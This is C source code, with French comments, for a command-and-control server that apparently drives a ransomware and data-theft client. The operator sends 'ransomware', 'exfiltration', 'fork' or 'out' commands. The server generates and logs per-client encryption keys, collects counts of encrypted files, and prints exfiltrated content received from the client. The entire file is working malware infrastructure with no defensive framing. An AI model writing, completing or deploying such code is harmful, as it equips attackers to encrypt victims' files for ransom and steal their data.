#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <time.h>

#define PORT 12345
#define BUFFER_SIZE 1024
#define LOG_FILE "server_log.txt"

void log_encryption_key(const char *client_id, const char *key) {
    FILE *log_file = fopen(LOG_FILE, "a");
    if (!log_file) {
        perror("Erreur d'ouverture du fichier de log");
        return;
    }
    time_t now = time(NULL);
    fprintf(log_file, "[%s] Client ID: %s, Clé (ASCII): %s, Clé (HEX): ", ctime(&now), client_id, key);
    for (size_t i = 0; i < strlen(key); i++) {
        fprintf(log_file, "%02X", (unsigned char)key[i]);
    }
    fprintf(log_file, "\n");
    fclose(log_file);
}

void handle_client(int client_socket) {
    char buffer[BUFFER_SIZE] = {0};
    char client_id[BUFFER_SIZE] = {0};

    // Recevoir l'identifiant du client
    recv(client_socket, client_id, BUFFER_SIZE, 0);
    printf("Client connecté avec ID : %s\n", client_id);

    while (1) {
        // Demander un ordre
        printf("Entrer un ordre (ransomware, exfiltration, fork, out) : ");
        char order[BUFFER_SIZE] = {0};
        scanf("%s", order);

        // Envoyer l'ordre au client
        send(client_socket, order, strlen(order) + 1, 0);

        if (strcmp(order, "ransomware") == 0) {
            // Générer une clé de chiffrement
            char key[16];
            for (int i = 0; i < 15; i++) key[i] = 'A' + rand() % 26;
            key[15] = '\0';

            // Envoyer la clé au client
            send(client_socket, key, strlen(key) + 1, 0);
            log_encryption_key(client_id, key);

            // Recevoir le nombre de fichiers chiffrés
            recv(client_socket, buffer, BUFFER_SIZE, 0);
            printf("Nombre de fichiers chiffrés reçu du client : %s\n", buffer);

        } else if (strcmp(order, "exfiltration") == 0) {
            recv(client_socket, buffer, BUFFER_SIZE, 0);
            printf("Contenu exfiltré : %s\n", buffer);

        } else if (strcmp(order, "fork") == 0) {
            printf("Ordre fork envoyé au client.\n");

        } else if (strcmp(order, "out") == 0) {
            printf("Client déconnecté.\n");
            close(client_socket);
            break;

        } else {
            printf("Ordre inconnu. Réessayez.\n");
        }
    }
}

int main() {
    int server_socket, client_socket;
    struct sockaddr_in server_addr, client_addr;
    socklen_t addr_len = sizeof(client_addr);

    server_socket = socket(AF_INET, SOCK_STREAM, 0);
    if (server_socket == -1) {
        perror("Erreur de création du socket");
        exit(EXIT_FAILURE);
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(PORT);
    server_addr.sin_addr.s_addr = INADDR_ANY;

    if (bind(server_socket, (struct sockaddr *)&server_addr, sizeof(server_addr)) == -1) {
        perror("Erreur de liaison");
        exit(EXIT_FAILURE);
    }

    if (listen(server_socket, 5) == -1) {
        perror("Erreur d'écoute");
        exit(EXIT_FAILURE);
    }

    printf("Serveur en écoute sur le port %d...\n", PORT);

    client_socket = accept(server_socket, (struct sockaddr *)&client_addr, &addr_len);
    if (client_socket == -1) {
        perror("Erreur lors de l'acceptation du client");
        exit(EXIT_FAILURE);
    }

    handle_client(client_socket);

    close(server_socket);
    return 0;
}
